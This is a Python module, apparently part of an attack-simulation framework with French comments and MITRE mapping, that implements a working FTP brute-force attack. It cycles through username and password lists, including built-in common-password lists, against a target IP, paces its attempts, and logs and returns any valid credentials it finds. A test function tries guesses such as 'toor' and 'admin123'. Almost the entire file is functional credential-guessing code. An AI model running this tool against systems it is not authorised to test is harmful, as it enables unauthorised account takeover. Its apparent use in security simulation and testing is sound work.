#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Thu Apr 23 07:56:27 2026

@author: hounsousamuel
"""

"""
Exception                               Signification
error_perm                               Mauvais credentials → continuer
ConnectionRefusedError                   Port fermé → arrêter
socket.timeout                             Timeout → continuer
EOFError                                Serveur a fermé la connexion
"""

import os, sys
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", ".."))))
import time
import socket
import asyncio
import ftplib
import concurrent.futures
from tactics.base import Base
from tactics.mittres import MITRE
from tactics.initial_access.data.ftp_brute_force.passwords import COMMON_PASSWORDS, COMMON_USERNAMES
from simulateur_utils.logger import get_logger

logger = get_logger()

class FTPBruteForce(Base):
    def __init__(
        self, 
        name:str = "ftp_brute_force",
        timeout:int = 2, delay:int = 0.5, 
        max_attempts:int = 50, 
        total_timeout:float|None = None,
        **kwargs
    ):
        self.name = name
        super().__init__(name=self.name, **kwargs)
        self.start_time = time.time()
        self.timeout = timeout
        self.delay = delay
        self.max_attempts = max_attempts
        self.results = []
        self.founds = []
        self.attempts = 0
        self.thread_pool = concurrent.futures.ThreadPoolExecutor(
            max_workers=4,
            thread_name_prefix="ssh_brute_force_"
        )
        self.total_timeout = total_timeout
        self.stop_event = asyncio.Event()
        self.sleep_event = asyncio.Event()
        self.lock = asyncio.Lock()
        self.sleep_delay = 10
    
    def _try_connect(
        self,
        ip:str,
        port:int,
        username:str,
        password:str,
    ):
        ftp = ftplib.FTP()
        try:
            ftp.connect(host=ip, port=port, timeout=self.timeout)
            ftp.login(user=username, passwd=password)
            self.log(f"✅ SUCCESS: {username}:{password}", log=True)
            return True
        
        except ftplib.error_perm:
            self.log(f"❌ FAIL: {username}:{password}", log=True)
            return False
        
        except socket.timeout:
            return False
        
        except (ConnectionResetError, EOFError):
            self.sleep_event.set()
            return False
        
        except ConnectionRefusedError:
            self.stop_event.set()
            return False
        
        except Exception as e:
            self.log(f"⚠️ ERROR: {e}", log=True)
            return False
        
        finally:
            try:
                ftp.quit()
            except Exception:
                pass
            finally:
                ftp.close()
    
    async def _find_all_helpers(
        self,
        ip:str,
        port:int,
        username:str,
        password:str,
        loop: asyncio.AbstractEventLoop
    ):
        
        return await loop.run_in_executor(
            self.thread_pool,
            self._try_connect,
            ip, port, username, password
        )
        
    async def find_all_workers(
        self,
        ip:str,
        port:int,
        username:str,
        passwords:list[str],
        lock: asyncio.Lock,
    ) -> list[dict] :
    
        loop = asyncio.get_running_loop()
        trys = 0
        results = []
        founds = []
        for password in passwords:
                success = await self._find_all_helpers(ip, port, username, password, loop)
                trys += 1
                async with lock:
                    self.attempts += 1
                
                if self.stop_event.is_set():
                    break
                
                if self.sleep_event.is_set():
                    await asyncio.sleep(self.sleep_delay)
                    self.sleep_event.clear()
                    
                results.append({
                    'username': username,
                    'password': password,
                    "success":success,
                    })
                
                if success:
                    founds.append({
                        'username': username,
                        'password': password
                    })
                    break
                
                if trys % 5 == 0 and trys != 0:
                    trys = 0
                    async with lock:
                        self.results.extend(results)
                        self.founds.extend(founds)
                        founds, results = [], []


                await asyncio.sleep(self.delay)
            
        async with lock:
            self.results.extend(results)
            self.founds.extend(founds)
    
    async def monitor(self):
        while True:
            await asyncio.sleep(2)
            if self.stop_event.is_set() or self.attempts > self.max_attempts:
                return True
            
    async def find_all_async(
        self, ip:str, 
        port:int = 21,
        usernames:list|None = None, 
        passwords:list|None = None, 
        add_common:bool = False
    ):
        
        if add_common:
            usernames = list(set(usernames or [])) + list(set(COMMON_USERNAMES))
            passwords = list(set(passwords or [])) + list(set(COMMON_PASSWORDS))
        else:
            usernames = usernames or COMMON_USERNAMES
            passwords = passwords or COMMON_PASSWORDS
        
        self.log(f"Début FTP BRUTE FORCE à : {time.ctime()}, pour ip : {ip} et port {port} ", log=True)
        self.log(f"PORT : {port}")
        self.log(f"Users: {len(usernames)}, Passwords: {len(passwords)}", log=True)
        self.start_time = time.time()
        tasks = [
            asyncio.create_task(
                self.find_all_workers(ip, port, username, passwords, self.lock)
            )
                for username in usernames
        ]
        gather_tasks = asyncio.gather(*tasks)
        monitor_task = asyncio.create_task(self.monitor())
        done, pending = await asyncio.wait(
            [gather_tasks, monitor_task],
            timeout=self.total_timeout,
            return_when=asyncio.FIRST_COMPLETED
        )
        try:
            for task in done:
                task.result()
        except Exception as e:
            logger.print("Erreur :", str(e))
        
        finally:
            try:
                for task in tasks:
                    task.cancel()
                
                monitor_task.cancel()
                await asyncio.gather(*pending, return_exceptions=True)
            except Exception:
                pass
        
        self.end_time = time.time()
        self.log(f"Fin FTP BRUTE FORCE : {len(self.results)} tentatives", log=True)
        self.log(f"Credentials trouvés: {len(self.founds)}", log=True)
        return self.get_result()
    
    def find_all_sync(self, *args, **kwargs):
        return asyncio.run(self.find_all_async(*args, **kwargs))
    
    def get_result(self):
        self.save()
        
        mitres = [MITRE.get("FTPBruteForce", {})]
        results = {
            'severity': 'HIGH' if len(self.founds) > 0 else 'LOW',
            'elapsed': self.end_time - self.start_time,
            "mitres": mitres,
            'results':  {
                'founds': self.founds,
                'all_attempts': self.results,
                'total_attempts': self.attempts,
                'success_rate': len(self.founds) / self.attempts if self.attempts > 0 else 0
            },
        }
        
        return results

def test_ftp(ip: str = None):
    """Test rapide de FTPBruteForce sur une cible."""
    import json
    from pprint import pprint
    brute = FTPBruteForce(timeout=5, delay=0.2, max_attempts=20)
    # run(cont.short_id, ports=[22])
    result = brute.find_all_sync(
        ip=ip,
        port=21,
        usernames=['testuser', 'root', "admin"],
        passwords=['wrong1', 'wrong2', 'password', 'toor',"admin123"]
    )
    try:
        logger.print("✅ Résultat :")
        logger.print(f"  Elapsed        : {result['elapsed']:.2f}s")
        logger.print(f"  Success Rate   : {result['results']['success_rate']:.2f}")
        logger.print(f"  Nombre total d'essai  : {len(result['results']['all_attempts'])}")
        logger.print(f"  Crédentials Trouvés  : {result['results']['founds']}")
        logger.print(json.dumps(result['results']['all_attempts'], indent=2))
    except Exception:
        try:
            logger.print(pprint(result['results']["all_attempts"], indent=2))
        except Exception:
            logger.print(result['results']["all_attempts"])
            
            